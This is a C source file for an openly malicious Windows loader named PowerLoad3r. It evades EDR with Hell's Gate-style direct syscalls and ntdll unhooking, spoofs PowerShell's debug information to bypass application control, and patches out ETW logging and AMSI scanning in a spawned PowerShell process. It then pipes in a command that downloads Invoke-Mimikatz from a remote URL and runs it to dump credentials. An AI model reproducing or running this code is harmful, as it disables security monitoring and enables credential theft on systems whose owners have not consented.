
/*
    Author  => Abdallah Mohamed
    Title   => malicious powershell scripts loader designed to avoid detection.
*/

#include "PowerLoad3r.h"

VOID EnableConsoleColors()
{
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwMode = 0;
    GetConsoleMode(hOut, &dwMode);
    dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
    SetConsoleMode(hOut, dwMode);
}

VOID Banner()
{
    printf(BLUE
        "MMMMNx:;;;;;;:cc;;;;;;;;;;;;;;;;;;;;;;;:" NL
        "MMMW0l;;;;;;o0XKkc;;;;;;;;;;;;;;;;;;;;;l" NL
        "MMMNx : ;;;;;;o0WMWKxc;;;;;;;;;;;;;;;;;;:k" NL
        "MMMKl;;;;;;;;cxXWWWKkd:;;;;;;;;;;;;;;;lK" NL
        "MMWk : ;;;;;;;;;;ckXWMMN0o:;;;;;;;;;;;;:xN" NC RED "                                     |" NL NC BLUE
        "MMKo;;;;;;;;;;;;;%sAuthor%sNOl;;;;;;;;;;;;c0M" NC RED "                ,------------=--------|___________|" NL NC BLUE
        "MWk : ;;;;;;;;;;;;;;:%sAbdallah%s;;;;;;;;;;dNM" NC RED "-=============%%%%%%|         |  |______|_|___________|" NL NC BLUE
        "MXo;;;;;;;;;;;;;:%sMohamed%sOd:;;;;;;;;;cOWM" NC RED "                 | | | | | | ||| | | | |___________|" NL NC BLUE
        "WOc;;;;;;;;;;:lxKNWNX0xl:;;;;;;;;;;;oXMM" NC RED "                 `------------=--------|           |" NL NC BLUE
        "Xd;;;;;;;;;cd0NWNKklc:;;;;;;;;;;;;;:kWMM" NC RED "                                       |" NL NC BLUE
        "Oc;;;;;;cdOXWWXOOOkkkkkkkkxo:;;;;;;oKMMM" NL
        "d;;;;;;cONWN0dcckNWWNWWWWWNOc;;;;;:kWMMM" NL
        "c;;;;;;:dkxl:;;;:loooooooolc;;;;;;lKMMMM" NL
        "c::::::::::::::::::::::::::::::::lOWMMMM" NL
    NC NL, NC BOLD, NC BLUE, NC BOLD, NC BLUE, NC BOLD, NC BLUE);
}

DWORD64 DeObfuscateHash(DWORD64 dwHash)
{
    return dwHash ^ HASHKEY;
}

VOID DeObfuscateData(PCHAR cData)
{
    for (int idx = 0; idx < strlen(cData); idx++)
    {
        cData[idx] = cData[idx] ^ KEY;
    }
}

VOID DeObfuscateAll()
{
    DeObfuscateData(g_cLoadLibraryA);
    DeObfuscateData(g_cCreateProcessA);
    DeObfuscateData(g_cTerminateProcess);
    DeObfuscateData(g_cCopyFileA);
    DeObfuscateData(g_cDeleteFileA);
    DeObfuscateData(g_cSleep);
    DeObfuscateData(g_cWaitForSingleObject);
    DeObfuscateData(g_cResumeThread);
    DeObfuscateData(g_cASB);
    DeObfuscateData(g_cEEW);
}

DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x7734773477347734;
    INT c;

    while (c = *str++)
        dwHash = ((dwHash << 0x5) + dwHash) + c;

    return dwHash;
}

VOID FindSyscall(PIMAGE pNtDLLImg, PSYSCALL_ENTRY pEntry)
{
    PCHAR cFuncName;
    PBYTE pFuncAddr = NULL;    

    /* HellsGate */
    for (WORD wIdx = 0; wIdx < pNtDLLImg->pExpDir->NumberOfNames; wIdx++)
    {
        cFuncName = (PCHAR)GETMODULEBASE(pNtDLLImg) + pNtDLLImg->pdwAddrOfNames[wIdx];
        pFuncAddr = (PBYTE)GETMODULEBASE(pNtDLLImg) + pNtDLLImg->pdwAddrOfFunctions[pNtDLLImg->pwAddrOfNameOrdinales[wIdx]];

        if (djb2(cFuncName) != DeObfuscateHash(pEntry->dwHash))
            continue;

        if ((pEntry->wSyscall = HellsGateGrabber((PVOID)pFuncAddr)) != 0)
            return;
        
        break;
    }

    /* HaloGata */
    for (WORD idx = 1; idx < SYSCALLSCOUNT; idx++)
    {
        /* Go Down */
        if ((pEntry->wSyscall = HaloGateDown((PVOID)pFuncAddr, idx)) != 0)
            return;

        /* Go Up */
        if ((pEntry->wSyscall = HaloGateUp((PVOID)pFuncAddr, idx)) != 0)
            return;
    }

    /* Veles' Reek technique (in case all syscalls were hooked) 
    Calculate syscall number from its position between others syscalls */    
    pEntry->wSyscall = VelesReek(pNtDLLImg->pTextSection->SizeOfRawData, (PVOID)((DWORD_PTR)GETMODULEBASE(pNtDLLImg) + pNtDLLImg->pTextSection->PointerToRawData), pFuncAddr);
}

VOID ResolveSyscalls(PIMAGE pNtDLLImg)
{
    g_SYSCALLs.WF.dwHash = 0xcbae884c67d80ce9;
    g_SYSCALLs.RF.dwHash = 0xb64511f5c5fa2ba;
    g_SYSCALLs.PVM.dwHash = 0xc4e9af712a970b5f;
    g_SYSCALLs.WVM.dwHash = 0x29c1a6db24036629;
    g_SYSCALLs.RVM.dwHash = 0x7b327125d38b69da;
    g_SYSCALLs.QIP.dwHash = 0x9860e22415b6e019;

    FindSyscall(pNtDLLImg, &g_SYSCALLs.WF);
    FindSyscall(pNtDLLImg, &g_SYSCALLs.RF);
    FindSyscall(pNtDLLImg, &g_SYSCALLs.PVM);
    FindSyscall(pNtDLLImg, &g_SYSCALLs.WVM);
    FindSyscall(pNtDLLImg, &g_SYSCALLs.RVM);
    FindSyscall(pNtDLLImg, &g_SYSCALLs.QIP);
}

PIMAGE ParseImage(PVOID pImg)
{
    PIMAGE pParseImg;
    HANDLE hHeap;

    if ((hHeap = GetProcessHeap()) == INVALID_HANDLE_VALUE)
        return NULL;

    /* Allocate memory space for the image */
    if (!(pParseImg = (PIMAGE)HeapAlloc(hHeap, 0, sizeof(IMAGE))))
    {
        return NULL;
    }

    /* Parse DOS Header */
    pParseImg->pDosHdr = (PIMAGE_DOS_HEADER)pImg;

    /* Check if we parse a valid image or not */
    if (pParseImg->pDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
    {
        /*
            This isn't a valid image,
            Every image has a fixed magic number ==> 0x5a4d
        */

        HeapFree(hHeap, 0, pParseImg);
        return NULL;
    }

    /* Parse NT Header */
    pParseImg->pNtHdr = (PIMAGE_NT_HEADERS)((DWORD_PTR)pImg + pParseImg->pDosHdr->e_lfanew);

    /* Check if this is the NT header or not */
    if (pParseImg->pNtHdr->Signature != IMAGE_NT_SIGNATURE)
    {
        HeapFree(hHeap, 0, pParseImg);
        return NULL;
    }

    /* Parse Export Directory */
    pParseImg->pExpDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)pImg + pParseImg->pNtHdr->OptionalHeader.DataDirectory[0].VirtualAddress);

    /* Parse .text section, it's a first section */
    pParseImg->pTextSection = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pParseImg->pNtHdr);

    /* Image size */
    pParseImg->dwSizeOfImage = pParseImg->pNtHdr->OptionalHeader.SizeOfImage;

    /* Parse EAT data */
    pParseImg->pdwAddrOfFunctions = (PDWORD)((DWORD_PTR)pImg + pParseImg->pExpDir->AddressOfFunctions);
    pParseImg->pdwAddrOfNames = (PDWORD)((DWORD_PTR)pImg + pParseImg->pExpDir->AddressOfNames);
    pParseImg->pwAddrOfNameOrdinales = (PWORD)((DWORD_PTR)pImg + pParseImg->pExpDir->AddressOfNameOrdinals);

    return pParseImg;
}

BOOL ResolveAPIs()
{
    HMODULE hModule;

    return (
        (hModule = GetModuleHandleW2(L"KERNEL32.DLL")) &&
        (g_APIs.pLoadLibraryA = (tLoadLibraryA)GetProcAddress2(hModule, g_cLoadLibraryA)) &&
        (g_APIs.pCreateProcessA = (tCreateProcessA)GetProcAddress2(hModule, g_cCreateProcessA)) &&
        (g_APIs.pTerminateProcess = (tTerminateProcess)GetProcAddress2(hModule, g_cTerminateProcess)) &&
        (g_APIs.pCopyFileA = (tCopyFileA)GetProcAddress2(hModule, g_cCopyFileA)) &&
        (g_APIs.pDeleteFileA = (tDeleteFileA)GetProcAddress2(hModule, g_cDeleteFileA)) &&
        (g_APIs.pSleep = (tSleep)GetProcAddress2(hModule, g_cSleep)) &&
        (g_APIs.pWaitForSingleObject = (tWaitForSingleObject)GetProcAddress2(hModule, g_cWaitForSingleObject)) &&
        (g_APIs.pResumeThread = (tResumeThread)GetProcAddress2(hModule, g_cResumeThread))
    );
}

BOOL InitAnonymousPipes(STARTUPINFOEXA *si)
{
    SECURITY_ATTRIBUTES sa = { 0 };

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    /* Create pipes and set our handles to retrieve results from the process */

    if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0))
        return FALSE;

    if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
        return FALSE;

    if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &sa, 0))
        return FALSE;

    if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
        return FALSE;


    si->StartupInfo.hStdError = g_hChildStd_OUT_Wr;
    si->StartupInfo.hStdOutput = g_hChildStd_OUT_Wr;
    si->StartupInfo.hStdInput = g_hChildStd_IN_Rd;
    si->StartupInfo.dwFlags |= STARTF_USESTDHANDLES;

    return TRUE;
}

VOID WriteToPipe(PCHAR pBuffer, DWORD dwBufferLen)
{
    IO_STATUS_BLOCK io;
    HellsGate(g_SYSCALLs.WF.wSyscall);
    while (!NT_SUCCESS(HellDescent(g_hChildStd_IN_Wr, NULL, NULL, NULL, &io, pBuffer, dwBufferLen, NULL, NULL)));
}

VOID ReadFromPipe()
{
    CHAR cBuffer[BUFSIZE];
    HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    IO_STATUS_BLOCK io;

    while (TRUE)
    {
        HellsGate(g_SYSCALLs.RF.wSyscall);
        if (!NT_SUCCESS(HellDescent(g_hChildStd_OUT_Rd, NULL, NULL, NULL, &io, cBuffer, BUFSIZE, NULL, NULL)) || io.Information == 0)
            break;

        HellsGate(g_SYSCALLs.WF.wSyscall);
        if (!NT_SUCCESS(HellDescent(hParentStdOut, NULL, NULL, NULL, &io, cBuffer, (DWORD)io.Information, NULL, NULL)))
            break;
    }
}

BOOL SpawnPowershell(PROCESS_INFORMATION *pi, STARTUPINFOEXA *si)
{   
    SIZE_T nSize = 0;
    DWORD64 dwPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    

    /* 
        Get the size of the list to allocate memory for it, 
        Avoid ERROR_INSUFFICIENT_BUFFER, This occurs because the data area passed to a system call is too small
        But we are ok.
    */
    if (!InitializeProcThreadAttributeList(NULL, 1, 0, &nSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        return FALSE;

    /* Allocate memory */
    if (!(si->lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, nSize)))
        return FALSE;

    /* Initialize the attribute list */
    if (!InitializeProcThreadAttributeList(si->lpAttributeList, 1, 0, &nSize))
        return FALSE;

    /* Set restrictions to prevent AV/EDRs from inject thier hooks */
    if (!UpdateProcThreadAttribute(si->lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &dwPolicy, sizeof(dwPolicy), NULL, NULL))
        return FALSE;

    if (!g_APIs.pCreateProcessA(NULL, PWSH, NULL, NULL, TRUE, CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, "C:\\Windows\\System32", (LPSTARTUPINFOA) si, pi))
        return FALSE;

    CloseHandle(g_hChildStd_OUT_Wr);
    CloseHandle(g_hChildStd_IN_Rd);

    return TRUE;
}

PVOID ReadProcessMemory2(HANDLE hProc, PVOID pAddr, SIZE_T nSize)
{
    PVOID pData;

    if (!(pData = HeapAlloc(GetProcessHeap(), 0, nSize)))
        return NULL;

    HellsGate(g_SYSCALLs.RVM.wSyscall);
    if (!NT_SUCCESS(HellDescent(hProc, pAddr, pData, nSize, NULL)))
        return NULL;

    return pData;
}

BOOL Patch(HANDLE hProc, LPVOID lpAddr, PBYTE pBuffer, SIZE_T nSize)
{

    /*
        NtProtectVirtualMemory doesn't act like VirtualProtectEX, it changes nSize to the size of the allocated region of pages,
        Also changes lpAddr to the begining of the memory region.
        If we don't save them and use the safe params with NtWriteVirtualMemory, we will get unexpected behavior,
        Because we will write N bytes (corruped data) at the begining of the memory region not at the address we want.
    */

    SIZE_T nSize2 = nSize;
    LPVOID lpAddr2 = lpAddr;
    DWORD dwOldProtect = 0;

    HellsGate(g_SYSCALLs.PVM.wSyscall);
    if (!NT_SUCCESS(HellDescent(hProc, &lpAddr2, &nSize2, PAGE_READWRITE, &dwOldProtect)))
        return FALSE;

    HellsGate(g_SYSCALLs.WVM.wSyscall);
    if (!NT_SUCCESS(HellDescent(hProc, lpAddr, pBuffer, nSize, NULL)))
        return FALSE;

    HellsGate(g_SYSCALLs.PVM.wSyscall);
    if (!NT_SUCCESS(HellDescent(hProc, &lpAddr2, &nSize2, dwOldProtect, &dwOldProtect)))
        return FALSE;


    return TRUE;
}

BOOL BypassApplicationControl(HANDLE hProc, LPVOID lpImgBaseAddr)
{
    PIMAGE_DOS_HEADER pDos = NULL;
    PIMAGE_NT_HEADERS pNt = NULL;
    PIMAGE_DEBUG_DIRECTORY pDbg = NULL;
    PPdbInfo pPDB;
    IMAGE_DATA_DIRECTORY dbgDataDir;
    PVOID pDbgRawDataAddr;
    
    /* Read image DOS header */
    if (!(pDos = (PIMAGE_DOS_HEADER)ReadProcessMemory2(hProc, lpImgBaseAddr, sizeof(IMAGE_DOS_HEADER))))
        return FALSE;

    /* Check on image magic number, to ensure if we read a valid image or not */
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    /* Read image NT header */
    if (!(pNt = (PIMAGE_NT_HEADERS)ReadProcessMemory2(hProc, (PVOID)((DWORD_PTR)lpImgBaseAddr + pDos->e_lfanew), sizeof(IMAGE_NT_HEADERS))))
        return FALSE;

    /* Check NT header signature */
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    /* Jump to Debug data directory to retrive address and size of debug dir */
    dbgDataDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];

    /* Read DEBUG directory */
    if (!(pDbg = (PIMAGE_DEBUG_DIRECTORY)ReadProcessMemory2(hProc, (PVOID)((DWORD_PTR)lpImgBaseAddr + dbgDataDir.VirtualAddress), dbgDataDir.Size)))
        return FALSE;

    /* Check the type of dir we read */
    if (pDbg->Type != IMAGE_DEBUG_TYPE_CODEVIEW)
        return FALSE;

    /* Address of debug data */
    pDbgRawDataAddr = (PVOID)((DWORD_PTR)lpImgBaseAddr + pDbg->AddressOfRawData);

    /* Read Debug data */
    if (!(pPDB = (PPdbInfo)ReadProcessMemory2(hProc, pDbgRawDataAddr, sizeof(PdbInfo))))
        return FALSE;

    /* Check Debug raw data signature */
    if (pPDB->dwSignature != IMAGE_DEBUG_SIGNATURE)
        return FALSE;

    /* Now we successfully reach debug info which contains some data, 
    Helps EDR to detect powershell, so let's spoof it to bypass this kind of restrictions */

    return (
        Patch(hProc, (PVOID)((DWORD_PTR)pDbgRawDataAddr + sizeof(PdbInfo) - sizeof(pPDB->cPdbFileName)), "\x50\x6f\x77\x72\x4c\x6f\x61\x64\x65\x72", 10) &&
        Patch(hProc, (PVOID)((DWORD_PTR)pDbgRawDataAddr + 0x52), "\x50\x6f\x77\x72\x4c\x6f\x61\x64\x65\x72", 10)
    );
}

BOOL UnHookRemoteProcess(HANDLE hProc, PVOID pNtDLLBase, PIMAGE pFresh, PIMAGE pHooked)
{
    return Patch(hProc, (PVOID)((DWORD_PTR)pNtDLLBase + pHooked->pTextSection->VirtualAddress), (PVOID)((DWORD_PTR)GETMODULEBASE(pFresh) + pFresh->pTextSection->VirtualAddress), pFresh->pTextSection->Misc.VirtualSize);
}

BOOL BlindETW(HANDLE hProc, HMODULE hModule)
{
    PVOID pEEW;

    if (!(pEEW = GetProcAddress2(hModule, g_cEEW)))
        return FALSE;

    /*
        xor rax,rax  ; Clear accumlator register via XORing by itself, this means the procedure will return 0 without log anything
        ret          ; return (the end of the procedure)
    */
    return Patch(hProc, pEEW, "\x48\x33\xc0\xc3", 4);
}

BOOL BypassAMSI(HANDLE hProc, HMODULE hModule)
{
    PVOID pASB;

    if (!(pASB = GetProcAddress2(hModule, g_cASB)))
        return FALSE;

    /*
        ; move 80070057h to eax which means error occured,
        ; this redirects scanner execution flow and makes amsi fails

        mov eax, 80070057h  ; Error handler
        ret                 ; return 
    */
    return Patch(hProc, pASB, "\xb8\x57\x00\x07\x80\xc3", 6);
}

INT main(INT argc, PCHAR *argv)
{
    HMODULE hModule;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOEXA si = { 0 };
    PROCESS_BASIC_INFORMATION pbi;
    _PEB remotePEB;
    PIMAGE pLocalNtDLLImg, pFreshNtDLLImg, pNtDLL2Img;
    PVOID pFreshNtDLL, pNtDLL2;
    SIZE_T nRetLen = 0;
    DWORD dwExit = 0;
    INT nRet = EXIT_SUCCESS;

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    EnableConsoleColors();
    Banner();

    /* Resolve ntdll addr */
    if (!(hModule = GetModuleHandleW2(L"ntdll.dll")))
    {
        PRINT_ERROR("Couldn't resolve ntdll.dll address");
        return EXIT_FAILURE;
    }

    PRINT_SUCCESS("ntdll base address is 0x%p , resolved using custom GetModuleHandle implementation", hModule);

    /* Parse local ntdll */
    if (!(pLocalNtDLLImg = ParseImage(hModule)))
    {
        PRINT_ERROR("Couldn't parse ntdll");
        return EXIT_FAILURE;
    }

    PRINT_STATUS("Deobfuscate API calls");
    DeObfuscateAll();

    PRINT_STATUS("Prepare syscalls and API calls");
    ResolveSyscalls(pLocalNtDLLImg);

    if (!ResolveAPIs())
    {
        PRINT_ERROR("Retrieving API calls failed");
        return EXIT_FAILURE;
    }

    PRINT_STATUS("Create a new copy of powershell.exe to bypass application control");

    if (!g_APIs.pCopyFileA("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", PWSH, FALSE))
    {
        PRINT_ERROR("Couldn't create a new copy of powershell.exe, remove this file if exist => '%s'", PWSH);
        nRet = EXIT_FAILURE;
        goto CLEANUP;
    }

    /* Create Anonymous pipes to communicate with the child process */
    if (!InitAnonymousPipes(&si))
    {
        PRINT_ERROR("Couldn't initialize anonymous pipes");
        nRet = EXIT_FAILURE;
        goto CLEANUP;
    }

    PRINT_SUCCESS("Anonymous pipes initialized successfully");

    if (!SpawnPowershell(&pi, &si))
    {
        PRINT_ERROR("Couldn't spawn powershell.exe");
        nRet = EXIT_FAILURE;
        goto CLEANUP;
    }

    PRINT_SUCCESS("powershell.exe spawned successfully in suspended mode");
    
    /* Try to read PBI which contains PEB address */
    HellsGate(g_SYSCALLs.QIP.wSyscall);
    if (!NT_SUCCESS(HellDescent(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &nRetLen)))
    {
        PRINT_ERROR("Couldn't read powershell process");
        nRet = EXIT_FAILURE;
        goto CLEANUP;
    }

    /* Try to read PEB */
    HellsGate(g_SYSCALLs.RVM.wSyscall);
    if (!NT_SUCCESS(HellDescent(pi.hProcess, pbi.pPebBaseAddress, &remotePEB, sizeof(_PEB), NULL)))
    {
        PRINT_ERROR("Couldn't read powershell process");
        nRet = EXIT_FAILURE;
        goto CLEANUP;
    }

    PRINT_STATUS("Try to spoof powershell debug information to bypass application control");
    if (!BypassApplicationControl(pi.hProcess, remotePEB.lpImageBaseAddress))
    {
        PRINT_ERROR("Couldn't spoof powershell footprints, if powershell in blacklist, maybe get detected");
    }
    else {
        PRINT_SUCCESS("Spoofed successfully");
    }
    
    /* Read remote ntdll which still not hooked */
    if (!(pFreshNtDLL = ReadProcessMemory2(pi.hProcess, hModule, pLocalNtDLLImg->dwSizeOfImage)))
    {
        PRINT_ERROR("Couldn't read a copy of ntdll from powershell process");
        nRet = EXIT_FAILURE;
        goto CLEANUP;
    }

    /* Parse the fresh copy of ntdll */
    if (!(pFreshNtDLLImg = ParseImage(pFreshNtDLL)))
    {
        PRINT_ERROR("Couldn't parse ntdll");
        nRet = EXIT_FAILURE;
        goto CLEANUP;
    }

    PRINT_STATUS("Resume execution of the powershell");
    g_APIs.pResumeThread(pi.hThread);

    PRINT_STATUS("Wait a few seconds to the process be ready");
    g_APIs.pSleep(10000);

    /* Read another ntdll copy after resume, maybe get hooked now */
    if (!(pNtDLL2 = ReadProcessMemory2(pi.hProcess, hModule, pLocalNtDLLImg->dwSizeOfImage)))
    {
        PRINT_ERROR("Couldn't read an another copy of ntdll from powershell process");
        nRet = EXIT_FAILURE;
        goto CLEANUP;
    }

    /* Parse the second copy of ntdll */
    if (!(pNtDLL2Img = ParseImage(pNtDLL2)))
    {
        PRINT_ERROR("Couldn't parse ntdll");
        nRet = EXIT_FAILURE;
        goto CLEANUP;
    }

    /* Check if the EDR was able to hooking the process */
    if (
        !RtlEqualMemory(
            (PVOID)((DWORD_PTR)pFreshNtDLL + pFreshNtDLLImg->pTextSection->VirtualAddress),
            (PVOID)((DWORD_PTR)pNtDLL2 + pNtDLL2Img->pTextSection->VirtualAddress),
            pFreshNtDLLImg->pTextSection->Misc.VirtualSize
        )
    )
    {
        PRINT_ERROR("EDR could inject its DLLs into the process");
        PRINT_STATUS("Try to unhook the remote process");
        
        if (UnHookRemoteProcess(pi.hProcess, hModule, pFreshNtDLLImg, pNtDLL2Img))
        {
            PRINT_SUCCESS("The remote process unhooked successfully");
        }
        else
        {
            PRINT_ERROR("Couldn't unhook the remote process");
        }
    }
    else
    {
        PRINT_SUCCESS("EDR couldn't inject its DLLs into the process, powershell process is unmonitored now");
    }

    if (!BlindETW(pi.hProcess, hModule))
    {

        PRINT_ERROR("Couldn't blind ETW");
        nRet = EXIT_FAILURE;
        goto CLEANUP;
    }
    
    PRINT_SUCCESS("ETW blinded successfully");

    if (!BypassAMSI(pi.hProcess, g_APIs.pLoadLibraryA("amsi.dll")))
    {
        PRINT_ERROR("Couldn't patch AMSI");
        nRet = EXIT_FAILURE;
        goto CLEANUP;
    }
    
    PRINT_SUCCESS("AMSI patched successfully");
    WriteToPipe("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')\n", 172);
    WriteToPipe("Invoke-Mimikatz -Command coffee\n", 32);
    WriteToPipe("exit\n", 5); // Don't remove this instruction, it terminates the process

    PRINT_SUCCESS("Instructions injected, wait until be executed");
    PRINT_STATUS("OUTPUT :\n");
    puts("--------------------------------------------------------------------------");
    ReadFromPipe();
    puts("--------------------------------------------------------------------------\n");
    PRINT_SUCCESS("Finish");

    /* Wait until the process completely terminated */
    g_APIs.pWaitForSingleObject(pi.hProcess, INFINITE);

CLEANUP:
    PRINT_STATUS("Cleanup");
    g_APIs.pSleep(2000);
    if (pi.hProcess != NULL && GetExitCodeProcess(pi.hProcess, &dwExit) && dwExit == STILL_ACTIVE) g_APIs.pTerminateProcess(pi.hProcess, 1);
    if (si.lpAttributeList) DeleteProcThreadAttributeList(si.lpAttributeList);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    if (g_hChildStd_OUT_Rd) CloseHandle(g_hChildStd_OUT_Rd);
    if (g_hChildStd_IN_Wr) CloseHandle(g_hChildStd_IN_Wr);
    if (!g_APIs.pDeleteFileA(PWSH)) PRINT_ERROR("Couldn't delete '%s' with 0x%x error number, try manually", PWSH, GetLastError());

    return nRet;
}

